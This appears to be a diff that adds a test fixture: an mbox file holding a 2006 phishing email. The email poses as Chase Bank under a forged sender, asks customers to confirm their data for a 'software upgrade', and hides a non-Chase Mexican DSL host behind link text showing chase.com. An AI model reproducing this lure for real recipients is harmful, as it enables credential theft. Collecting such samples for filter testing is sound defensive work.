@@ -1,0 +1,64 @@
+From nobody Sun Jan 25 13:48:14 2015
+Return-Path: <admin@sis.tecmilenio.edu.mx>
+X-Original-To: nobody@login.example.com
+Delivered-To: nobody@login.example.com
+Received: from mail2.example.com (mail2.example.com [10.3.4.5])
+ by naughty.example.com (Postfix) with ESMTP id 9E0B2537206
+ for <nobody@login.example.com>; Thu, 16 Mar 2006 06:06:16 -0500 (EST)
+Received: from sis.tecmilenio.edu.mx (unknown [200.76.152.189])
+ by mail2.example.com (Postfix) with ESMTP id 2EA0C6FA245
+ for <nobody@example.com>; Thu, 16 Mar 2006 06:06:16 -0500 (EST)
+Received: from sis.tecmilenio.edu.mx (localhost.localdomain [127.0.0.1])
+ by sis.tecmilenio.edu.mx (8.13.4/8.13.4) with ESMTP id k2GB5BiV028093
+ for <nobody@example.com>; Thu, 16 Mar 2006 05:05:11 -0600
+Received: (from admin@localhost)
+ by sis.tecmilenio.edu.mx (8.13.4/8.13.4/Submit) id k2GB5BwG028092;
+ Thu, 16 Mar 2006 05:05:11 -0600
+Date: Thu, 16 Mar 2006 05:05:11 -0600
+Message-Id: <200603161105.k2GB5BwG028092@sis.tecmilenio.edu.mx>
+To: nobody@example.com
+Subject: New message from Chase Bank
+From: Chase Online Banking <customercare@chase.com>
+Content-Type: text/html
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 625
+
+
+<html>
+<head><style type="text/css"><!--
+blockquote, dl, ul, ol, li { padding-top: 0 ; padding-bottom: 0 }
+--></style><title>Fwd: Software Upgrade</title></head><body>
+<blockquote type="cite" cite><img 
+src="http://www.hasug.org/committee/chase_logo.gif"><br><br><font 
+face="Verdana" size="-1">Dear
+client of Chase Bank,</font><br>
+</blockquote>
+<blockquote type="cite" cite><font face="Verdana" size="-1">Technical
+services of the Chase Bank are carrying out a planned software
+upgrade. We earnestly ask you to visit the following link to start the
+procedure of confirmation on customers data.</font><br>
+</blockquote>
+<blockquote type="cite" cite><font face="Verdana" size="-1">To get
+started, please click the link below:</font><br>
+</blockquote>
+<blockquote type="cite" cite><a
+href="http://dsl-200-67-165-66.prod-empresarial.com.mx/cmserver/users/default/index.html"><font
+face="Verdana"
+size="-1"><b>http://www.chase.com//cmserver/users/default/confirm.cfm</b
+></font></a><br>
+</blockquote>
+<blockquote type="cite" cite><font face="Verdana" size="-1">This
+instruction has been sent to all bank customers and is obligatory to
+fallow.</font><br>
+</blockquote>
+<blockquote type="cite" cite><font face="Verdana" size="-1">Thank
+you,</font><br>
+</blockquote>
+<blockquote type="cite" cite><font face="Verdana" size="-1">Customers
+Support Service.</font></blockquote>
+<div><br></div>
+</body>
+</html>
+
